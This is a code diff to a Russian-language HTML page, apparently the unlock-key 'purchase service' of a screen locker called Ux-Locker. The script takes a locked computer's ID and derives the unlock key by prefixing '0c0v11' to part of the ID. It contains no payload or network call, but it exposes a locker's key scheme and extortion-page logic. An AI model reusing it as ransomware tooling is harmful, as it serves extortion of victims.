@@ -4,7 +4,7 @@
     <meta charset="utf-8">
     <title>Ux-Locker [Служба покупки ключа разблокировки]</title>
     <style>
-      body {background-color: black;}
+      body {background-color: black; color: white; font-size: 16pt; text-align: center; cursor: default;}
     </style>
   </head>
   <body>
@@ -21,26 +21,27 @@
       var key
 
       function process() {
-        while(true) {
-          key = window.prompt("Введите ID заблокированного компьютера (указан снизу)");
-          if (key !== null) {
-            if (key.length !== 14) {
+        key = window.prompt("Введите ID заблокированного компьютера (указан снизу)");
+        if (key !== null) {
+          if (key.length !== 14) {
+            wrong_format();
+          } else {
+            if (!key.includes("10-")) {
               wrong_format();
-            } else {
-              if (!key.includes("10-")) {
-                wrong_format();
-              } else {next();}
-            }
+            } else {next();}
           }
-
         }
       }
       function wrong_format() {
-        return alert("Неверный формат ID!");
+        alert("Неверный формат ID!");
+        return process();
       }
       function next() {
-        var _x = "0c0v11" + key.slice(0,9).replace("10-", "");
-        alert("Ваш ключ: " + _x + ". Вы можете закрыть это окно.");
+        result("0c0v11" + key.slice(0,9).replace("10-", ""));
+
+      }
+      function result(key) {
+        document.getElementById("message").innerHTML = "<b>UX-Locker</b><hr>Ваш ключ:<br><span style=\"color: black; background-color: white;\">" + key + "</span>";
       }
     </script>
     <noscript>Ваш браузер не поддерживает JavaScript.</noscript></body>
